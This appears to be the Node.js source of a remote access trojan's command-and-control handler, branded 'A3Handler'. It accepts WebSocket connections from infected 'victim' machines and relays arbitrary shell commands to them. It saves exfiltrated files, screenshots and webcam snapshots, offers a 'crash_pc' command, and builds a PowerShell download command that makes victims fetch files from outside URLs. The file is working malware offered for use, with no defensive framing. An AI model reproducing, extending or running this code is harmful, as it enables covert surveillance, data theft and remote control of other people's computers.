const WebSocket = require('ws');
const colors = require('colors');
var mkdirp = require('mkdirp');
require('events').EventEmitter.setMaxListeners = 1;
var menu = true;
var WebsocketErrorCodes = {
"1000":"CLOSE_NORMAL",
"1001":"CLOSE_GOING_AWAY",
"1002":"CLOSE_PROTOCOL_ERROR",
"1003":"CLOSE_UNSUPPORTED",
"1005":"CLOSE_NO_STATUS",
"1006":"CLOSE_ABNORMAL",
"1009":"CLOSE_TOO_LARGE"
};
var workingDir = "";
sessions = [];
var filename = "";
const wss = new WebSocket.Server({
	port: 4422
});
const readline = require('readline');
const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout,
	completer: suggestions,
	historySize: 60
});
currentSession = 0;
console.log("\n");
console.log("      _                      _______                      _");
console.log("   _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_");
console.log("  dP'  ~YMMb            dOOOOOOA3OOOOOOOb            aMMP~  `Yb");
console.log("  V      ~\"Mb         dOOOOOOA3OOOOOOOOOb          dM\"~      V");
console.log("           `Mb.       dOOOOOOOOA3OOOOOOOOOb       ,dM'");
console.log("            `YMb._   |OOOOOOOOOA3OOOOOOOOOO|   _,dMP'");
console.log("       __     `YMMM| OP'~\"YOOOOOOOOOOOP\"~`YO |MMMP'     __");
console.log("     ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.");
console.log("  _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._");
console.log(" <MMP'     `~YMMa_   YOOo   @  OOO  @   oOOP   _adMP~'      `YMM>");
console.log("              `YMMMM\`OOOo     OOO     oOOO'/MMMMP'");
console.log("      ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.");
console.log("    ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.");
console.log("   ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.");
console.log("   MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM");
console.log("   YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP");
console.log("    `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'");
console.log("      `'                  `OObNNNNNdOO'                   `'");
console.log("                            `~OOOOO~'");
console.log("\n\n");
console.log("[".bold + "+".green + "] Waiting for connection to server !".bold);

rl.setPrompt("A3".bold.underline + " A3Handler".bold.red + "# ".bold);
rl.prompt();

wss.on('connection', function connection(ws) {
	sessions.push(ws);
	var lastSession = sessions.length - 1;
	sessions[lastSession].clientAddress = ws._socket.remoteAddress.replace("::ffff:", "");
	if(menu){
		console.log("\n[".bold + "+".green + "] Connected to client : ".bold + ws._socket.remoteAddress.replace("::ffff:", "").underline.green + " !".bold);
		menu = false;
		currentSession = lastSession;
		console.log("[".bold + "+".green + "] Session ID : ".bold + currentSession);
	}else{
		console.log("[".bold + "+".green + "] New client connected : ".bold + ws._socket.remoteAddress.replace("::ffff:", "").underline.green + " !".bold);
	}
	ws.on('message', function incoming(message) {
		if(ws._socket.remoteAddress.replace("::ffff:", "") == sessions[currentSession].clientAddress){
			if (typeof message == "object") {
				mkdirp('files/' + sessions[currentSession].clientAddress + "/", function(err) { 
					var stream = require("fs").createWriteStream('files/' + sessions[currentSession].clientAddress + "/" + filename);
					stream.once("open", function () {
						stream.write(message, "base64");
						stream.on('finish', function () {
							stream.close();
						});
					});
				});
			}else if(message.startsWith("##FILENAME##")){
				filename = message.replace("##FILENAME","").split("/")[message.replace("##FILENAME##","").split("/").length-1];
			}else if(message.startsWith("##MESSAGE##")){
				if(JSON.parse(message.replace("##MESSAGE##","")).type == "error"){
					console.log("[".bold + "-".red + "] ".bold + JSON.parse(message.replace("##MESSAGE##","")).message.bold);
				}else if(JSON.parse(message.replace("##MESSAGE##","")).type == "info"){
					console.log("[".bold + "i".yellow + "] ".bold + JSON.parse(message.replace("##MESSAGE##","")).message.bold);
				}
			}else if (message.startsWith("hello")) {
				workingDir = message.substring(message.indexOf("##") + 2, message.lastIndexOf("##"));
				rl.setPrompt(workingDir + "> ");
				rl.prompt();
			} else if (message.startsWith("##finish##")) {
				ws.send("#pwd");
			} else if (message.startsWith("##SCREENSHOT##")) {
				var base64Data = message.replace("##SCREENSHOT##", "").replace(/^data:image\/png;base64,/, "");
				mkdirp('screenshots/' + sessions[currentSession].clientAddress + "/", function(err) { 
					require("fs").writeFile("screenshots/" + sessions[currentSession].clientAddress + "/" + Date.now() + ".png", base64Data, 'base64', function (err) {});
				});
			}else if (message.startsWith("##SPEEDTEST##")) {
				console.log("[".bold + "i".yellow + "] Victim's internet speed is ".bold + JSON.parse(message.replace("##SPEEDTEST##","")).speed.bold + "Mo/s !".bold);
			}else if (message.startsWith("##WEBCAM_SNAP##")) {
				console.log("[".bold + "+".blue + "] Photo received !".bold);
				var base64Data = message.replace("##WEBCAM_SNAP##", "").replace(/^data:image\/png;base64,/, "");
				mkdirp('webcam_snaps/' + sessions[currentSession].clientAddress + "/", function(err) { 
					require("fs").writeFile('webcam_snaps/' + sessions[currentSession].clientAddress + "/" + Date.now() + ".jpeg", base64Data, 'base64', function (err) {});
				});
			}else {
				console.log(message.grey);
			}
		}
	});
	ws.on('close', function (reasonCode, description) {
		if(menu){
			console.log("\n[".bold + "-".red + "] Peer ".bold + sessions[currentSession].clientAddress.underline.red + ' disconnected !'.bold);
			if(WebsocketErrorCodes.hasOwnProperty(reasonCode)){
				console.log("[".bold + "i".yellow + "] Got error code : ".bold + WebsocketErrorCodes[reasonCode].underline + " !".bold);
			}else{
				console.log("[".bold + "i".yellow + "] Unkown error code !".bold);
			}
		}else{
			if(WebsocketErrorCodes.hasOwnProperty(reasonCode)){
				console.log("\n[".bold + "i".yellow + "] Peer ".bold + sessions[currentSession].clientAddress.underline.red + " disconected, session ".bold + findSessionNumber(ws, sessions) + " closed. Got error code : ".bold + WebsocketErrorCodes[reasonCode].underline + " !".bold);
			}else{
				console.log("\n[".bold + "i".yellow + "] Peer ".bold + sessions[currentSession].clientAddress.underline.red + " disconected, session ".bold + findSessionNumber(ws, sessions) + " closed. Unkown error code !".bold);
			}
			menu = true;
			
		}
		delete sessions[findSessionNumber(ws, sessions)];
		sessions.length -= 1;
		rl.setPrompt("A3".bold.underline + " A3Handler".bold.red + "# ".bold);
		rl.prompt();
	});

});

function findSessionNumber(SS, SE){
	for(obj in SE){
		if(SE[obj].clientAddress == SS._socket.remoteAddress.replace("::ffff:", "")){
			return obj;
			break;
		}
	}
}

function suggestions(line) {
	const completions = 'win_help exit help speedtest sessions background list_users crash_pc upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
	const hits = completions.filter((c) => c.startsWith(line));
	return [hits.length ? hits : completions, line];
}

rl.on('line', (line) => {
	var msg = line.trim();
	if(!menu){
		if (msg == "screenshot") {
			console.log("[".bold + "+".blue + "] Uploading screenshot (May exceed 10MO, please be patient)...".bold);
			sessions[currentSession].send(msg);
		} else if (msg == "speedtest") {
			console.log("[".bold + "+".blue + "] Speed testing...".bold);
			sessions[currentSession].send(msg);
		} else if (msg == "background") {
			console.log("[".bold + "+".blue + "] Session is now in background...".bold);
			menu = true;
			rl.setPrompt("A3".bold.underline + " A3Handler".bold.red + "# ".bold);
			rl.prompt();
		} else if (msg.startsWith("upload_file")) {
			console.log("[".bold + "+".blue + "] Uploading file (Please be patient)...".bold);
			sessions[currentSession].send(msg);
		} else if (msg.startsWith("crash_pc")) {
			if(msg.split(" ").length != 2){
				console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "crash_pc <times (int)>");
				rl.prompt();
			}else{
				if(!isNaN(msg.split(" ")[1]) && parseInt(Number(msg.split(" ")[1])) == msg.split(" ")[1] && !isNaN(parseInt(msg.split(" ")[1], 10))){
					console.log("[".bold + "+".blue + "] Sent death request !".bold);
					sessions[currentSession].send(msg);
				}else{
					console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Argument : " + "<times>".bold + " needs to be an integer.");
					rl.prompt();
				}
			}
		} else if (msg.startsWith("download_url")) {
			if (msg.split(" ").length == 4) {
				var string = msg.split(" ");
				var url = string[1];
				var filename = string[2];
				var path = string[3];
				if(ValidURL(url)){
					console.log("[".white + "+".blue + "]".white + " Download request sent ! Please wait while downloading...".bold);
					sessions[currentSession].send('cd ' + path + ' & powershell -c \"(New-Object Net.WebClient).DownloadFile(\'' + url + '\', \'' + filename + '\')\"');
				}else{
					console.log("[".white + "-".red + "]".white + " Wrong URL !");
					rl.prompt();
				}
			}else{
				console.log("[".white + "-".red + "]".white + " Wrong arguments ! ".red + "Usage : ".bold + "download_url <url> <filename> <path>");
				rl.prompt();
			}
		}else if(msg == "webcam_snap"){
			console.log("[".bold + "+".blue + "] Capturing and uploading picture (May exceed 10MO, please be patient)...".bold);
			sessions[currentSession].send(msg);
		}else if(msg == "list_users"){
			sessions[currentSession].send("cd /Users & dir");
		}else if(msg == "help"){
			console.log(cmdListSessions.join("\n"));
			rl.prompt();
		}else if(msg == "win_help"){
			sessions[currentSession].send("help");
		}else if(msg == "exit"){
			console.log("[".bold + "+".green + "] Have a great day ! ".bold + "A3".underline.cyan +  " over !".bold);
			process.exit(0);
		}else{
			sessions[currentSession].send(msg);
		}
	}else{
		if(msg.startsWith("sessions")){
			if(msg.split(" ").length == 2 && msg.split(" ")[1] == "list"){
				if(sessions.length > 0){
					for(s in sessions){
						console.log("LISTING SESSIONS : ");
						console.log("Session : ID : ".bold + s.bold.cyan + " IP : ".bold + sessions[s].clientAddress.bold.cyan);
					}
				}else{
					console.log("[".white + "-".red + "]".white + " No sessions !".red);
				}
			}else if(msg.split(" ").length == 3 && msg.split(" ")[1] == "connect"){
				if(sessions.hasOwnProperty(msg.split(" ")[2])){
					currentSession = msg.split(" ")[2];
					menu = false;
					sessions[currentSession].send("SENDHELLO");
				}
			}else{
				console.log("[".white + "-".red + "]".white + " Wrong arguments ! ".red + "Usage : ".bold + "sessions connect <ID>\n                              sessions list");
			}
			rl.prompt();
		}else if(msg == "help"){
			console.log(cmdListHandler.join("\n"));
			rl.prompt();
		}else if(msg == "exit"){
			console.log("[".bold + "+".green + "] Have a great day ! ".bold + "A3".underline.cyan +  " over !".bold);
			process.exit(0);
		}else{
			console.log("[".white + "-".red + "]".white + " Unkown command !".red);
			rl.prompt();
		}
	}
}).on('close', () => {
	console.log("");
	console.log("[".bold + "I".magenta + "] The request was cancelled. If you want to leave the console, type \"exit\".".bold)
	rl.prompt();
});

function ValidURL(str) {
	if(str.indexOf('http') > -1) {
	  return true;
	} else {
	  return false;
	}
  }

var cmdListSessions = ["help => shows this message.","screenshot => take screenshot of victim's computer screen. Screenshots are located in screeshots/ClientIP folder."];
var cmdListHandler = ["help => shows this message.",""];